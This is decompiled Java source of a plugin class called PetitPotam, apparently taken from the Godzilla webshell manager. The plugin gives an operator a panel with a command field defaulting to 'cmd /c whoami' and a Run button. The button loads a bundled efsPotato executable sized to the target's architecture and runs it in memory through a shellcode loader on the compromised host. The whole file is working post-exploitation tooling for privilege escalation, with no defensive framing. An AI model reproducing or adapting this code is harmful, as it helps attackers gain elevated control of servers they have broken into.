/*    */ package shells.plugins.generic;
/*    */ 
/*    */ import core.Encoding;
/*    */ import core.imp.Payload;
/*    */ import core.imp.Plugin;
/*    */ import core.shell.ShellEntity;
/*    */ import core.ui.component.RTextArea;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import java.awt.BorderLayout;
/*    */ import java.awt.Component;
/*    */ import java.awt.event.ActionEvent;
/*    */ import java.awt.event.ComponentAdapter;
/*    */ import java.awt.event.ComponentEvent;
/*    */ import javax.swing.JButton;
/*    */ import javax.swing.JLabel;
/*    */ import javax.swing.JPanel;
/*    */ import javax.swing.JScrollPane;
/*    */ import javax.swing.JSplitPane;
/*    */ import javax.swing.JTextField;
/*    */ import util.UiFunction;
/*    */ import util.automaticBindClick;
/*    */ import util.functions;
/*    */ 
/*    */ public abstract class PetitPotam
/*    */   implements Plugin
/*    */ {
/*    */   private final JPanel panel;
/*    */   private final JLabel argsLabel;
/*    */   private final JTextField argsTextField;
/*    */   private final JButton runButton;
/*    */   private final JSplitPane splitPane;
/*    */   
/*    */   public PetitPotam() {
/* 34 */     this.panel = new JPanel(new BorderLayout());
/* 35 */     this.argsLabel = new JLabel("args");
/* 36 */     this.argsTextField = new JTextField(" cmd /c whoami ");
/* 37 */     this.runButton = new JButton("Run");
/* 38 */     this.resultTextArea = new RTextArea();
/* 39 */     this.splitPane = new JSplitPane();
/*    */     
/* 41 */     this.splitPane.setOrientation(0);
/* 42 */     this.splitPane.setDividerSize(0);
/*    */     
/* 44 */     JPanel topPanel = new JPanel();
/* 45 */     topPanel.add(this.argsLabel);
/* 46 */     topPanel.add(this.argsTextField);
/* 47 */     topPanel.add(this.runButton);
/*    */     
/* 49 */     this.splitPane.setTopComponent(topPanel);
/* 50 */     this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
/*    */     
/* 52 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*    */         {
/*    */           public void componentResized(ComponentEvent e) {
/* 55 */             PetitPotam.this.splitPane.setDividerLocation(0.15D);
/*    */           }
/*    */         });
/*    */     
/* 59 */     this.panel.add(this.splitPane);
/*    */   }
/*    */ 
/*    */   
/*    */   private final RTextArea resultTextArea;
/*    */   private boolean loadState;
/*    */   protected ShellEntity shellEntity;
/*    */   
/*    */   private void runButtonClick(ActionEvent actionEvent) {
/* 68 */     if (this.loader == null) {
/* 69 */       this.loader = getShellcodeLoader();
/*    */     }
/*    */     
/* 72 */     if (this.loader == null) {
/* 73 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
/*    */       
/*    */       return;
/*    */     } 
/* 77 */     byte[] pe = functions.readInputStreamAutoClose(PetitPotam.class.getResourceAsStream("assets/efsPotato-" + (this.payload.isX64() ? "64" : "32") + ".exe"));
/*    */     
/*    */     try {
/* 80 */       byte[] result = this.loader.runPe2("\"" + this.argsTextField.getText().trim() + "\"", pe, 6000);
/* 81 */       this.resultTextArea.setText(this.encoding.Decoding(result));
/* 82 */     } catch (Exception e) {
/* 83 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
/*    */     } 
/*    */   }
/*    */   protected Payload payload; private Encoding encoding; private ShellcodeLoader loader;
/*    */   
/*    */   public void init(ShellEntity shellEntity) {
/* 89 */     this.shellEntity = shellEntity;
/* 90 */     this.payload = this.shellEntity.getPayloadModule();
/* 91 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 92 */     automaticBindClick.bindJButtonClick(PetitPotam.class, this, PetitPotam.class, this);
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public JPanel getView() {
/* 99 */     return this.panel;
/*    */   }
/*    */   
/*    */   protected abstract ShellcodeLoader getShellcodeLoader();
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\generic\PetitPotam.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */